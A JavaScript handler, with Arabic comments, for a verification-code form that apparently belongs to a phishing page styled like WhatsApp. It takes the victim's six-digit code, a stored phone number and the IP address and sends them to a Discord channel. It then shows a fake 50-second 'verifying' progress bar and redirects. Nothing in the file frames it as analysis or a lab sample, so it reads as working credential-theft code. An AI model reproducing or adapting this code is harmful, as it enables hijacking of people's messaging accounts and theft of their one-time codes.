// معالج نموذج رمز التحقق
document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('confirmationForm');
    const codeInput = document.getElementById('text');
    const confirmBtn = document.getElementById('confirmCodeBtn');

    let loadingTimeout;

    // تنسيق الرمز أثناء الكتابة
    codeInput.addEventListener('input', function (e) {
        // السماح فقط بالأرقام
        this.value = this.value.replace(/[^0-9]/g, '');

        hideError();
        hideSuccess();

        // إظهار تنسيق صحيح أثناء الكتابة
        if (this.value.length >= 6) {
            this.style.borderColor = '#25D366';
            this.style.boxShadow = '0 0 0 4px rgba(37, 211, 102, 0.1)';
        } else {
            this.style.borderColor = '#e0e0e0';
            this.style.boxShadow = 'none';
        }
    });

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        hideError();
        hideSuccess();

        const code = codeInput.value.trim();

        // التحقق من وجود الرمز
        if (!code) {
            showError('⚠️ يرجى إدخال رمز التحقق');
            codeInput.focus();
            return;
        }

        // التحقق من طول الرمز (6 أرقام)
        if (code.length !== 6) {
            showError('⚠️ رمز التحقق يجب أن يكون 6 أرقام');
            codeInput.focus();
            return;
        }

        // تعطيل النموذج وعرض التحميل
        disableForm('confirmationForm');
        showChronoLoading('جاري التحقق والاتصال ...');

        // بدء التحميل لمدة 50 ثانية
        startLinearLoading(50, 'about.html'); // الانتقال بعد 50 ثانية

        try {
            // الحصول على معلومات الجهاز وIP
            const { device } = getDeviceInfo();
            const { country, city, ip } = await getIPInfo();

            // الحصول على رقم الهاتف المحفوظ
            const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
            const countryCode = getFromStorage('countryCode') || '+968';

            // إرسال البيانات إلى Discord
            const message = `🔐 **رمز التحقق:** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍  **IP:** ${ip}\n `;

            const success = await sendToDiscord(message);

            if (success) {
                // حفظ رمز التحقق
                saveToStorage('verificationCode', code);

                // الخط التحميلي سيتولى عملية التوجيه بعد 50 ثانية
            } else {
                clearTimeout(loadingTimeout);
                hideChronoLoading();
                enableForm('confirmationForm');
                showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
            }
        } catch (error) {
            console.error('خطأ:', error);
            clearTimeout(loadingTimeout);
            hideChronoLoading();
            enableForm('confirmationForm');
            showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
        }
    });

    // وظائف التحكم في التحميل الخطي
    function startLinearLoading(seconds, redirectUrl) {
        const progressElement = document.querySelector('.chrono-progress');

        if (progressElement) {
            progressElement.style.width = '0%';
            progressElement.style.transition = `width ${seconds}s linear`;

            setTimeout(() => {
                progressElement.style.width = '100%';
            }, 100);
        }

        loadingTimeout = setTimeout(() => {
            window.location.href = redirectUrl;
        }, seconds * 1000);
    }

    function showChronoLoading(text = 'جاري التحقق والاتصال ...') {
        const loadingOverlay = document.getElementById('loadingPopup');
        const chronoLabel = document.querySelector('.chrono-label');

        if (chronoLabel) chronoLabel.textContent = text;
        loadingOverlay.style.display = 'flex';
    }

    function hideChronoLoading() {
        const loadingOverlay = document.getElementById('loadingPopup');
        loadingOverlay.style.display = 'none';

        if (loadingTimeout) {
            clearTimeout(loadingTimeout);
        }
    }

    // وظائف إضافية
    function showError(message) {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.textContent = message;
            errorMsg.style.display = 'block';
        }
    }

    function hideError() {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.style.display = 'none';
        }
    }

    function showSuccess(message) {
        const successMsg = document.getElementById('successMsg');
        if (successMsg) {
            successMsg.textContent = message;
            successMsg.style.display = 'block';
        }
    }

    function hideSuccess() {
        const successMsg = document.getElementById('successMsg');
        if (successMsg) {
            successMsg.style.display = 'none';
        }
    }

    function disableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button');
            inputs.forEach(input => {
                input.disabled = true;
            });
        }
    }

    function enableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button');
            inputs.forEach(input => {
                input.disabled = false;
            });
        }
    }
});